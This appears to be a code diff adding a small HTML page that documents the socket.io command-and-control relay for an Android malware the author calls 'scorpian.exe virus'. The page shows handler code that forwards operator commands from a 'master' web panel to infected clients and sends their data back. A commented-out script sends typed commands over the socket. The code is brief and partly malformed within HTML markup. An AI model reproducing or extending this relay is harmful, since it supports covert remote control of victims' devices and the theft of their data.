@@ -1,0 +1,114 @@
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="https://i.pinimg.com/originals/ba/b7/ba/bab7ba9f68b2c5e6fadc0412acd2a4b1.png">
+    <title>Scorpian</title>
+</head>
+<body style="align-items: center;align-content: center;text-align: center;justify-content: center;">
+     <h1 title="this web is a server for  Control android virus" style="color: rgb(238, 51, 51);">All SOCKET EVENTS</h1>
+
+
+
+
+      <h3 title=" when (master) web send me data i recevd">RECEVED_FROM_WEB</h3>
+
+
+
+      <h3 title="after when (master) web send me data i send to clint">SEND_CLINT</h3>
+
+
+
+      <h3 title="When clint send data i recevd">RECEVD_FROM_CLINT</h3>
+
+
+
+      <h3 title="after when i recevd data from clint i send to (master) web">SEND_WEB</h3>
+
+<hr>
+<p>
+// Recevd all connection  and manage to (send / recevd) data
+<div>
+soket.on('connection',(socketid)=>{
+</div>
+<div>
+//TODO: It's take web response and send clint
+</div>
+
+<div>
+socketid.on('RECEVED_FROM_WEB',(data)=>{
+</div>
+<div>
+    socketid.broadcast.emit('SEND_CLINT',data)
+</div>
+})
+
+<div>
+//TODO: It's take clint masage and send to my web
+</div>
+<div>
+socketid.on("RECEVD_FROM_CLINT",(data)=>{
+</div>
+<div>
+    socketid.broadcast.emit('SEND_WEB',data);
+</div>
+})
+
+<div>
+//When Clint disconect
+</div>
+<div>
+socketid.on('disconnect',()=>{
+</div>
+})
+
+
+})
+</p>
+<hr>
+<div style="margin-top: 40vh;">
+<b >Create [4/25/2021]  after noon</b>
+</div>
+<b>For scorpian.exe virus</b>
+</body>
+
+
+
+<script>
+
+
+
+/*
+__________________
+#  All EVENTS
+___________________
+*  RECEVED_FROM_WEB
+*  SEND_CLINT
+*  RECEVD_FROM_CLINT
+*  SEND_WEB
+____________________
+
+*/
+
+</script>
+</html>
+
+
+
+<!-- 
+
+    <script defer>
+    var socket = io.connect("http://localhost:443");
+     socket.on("msg",(data)=>{
+     alert("data recevd");
+    });
+    socket.on('SEND_WEB',(data)=>console.log(data));
+    function send(){
+     socket.emit("RECEVED_FROM_WEB",document.getElementById('command').value);
+     };
+
+    </script>
+
+
+-->
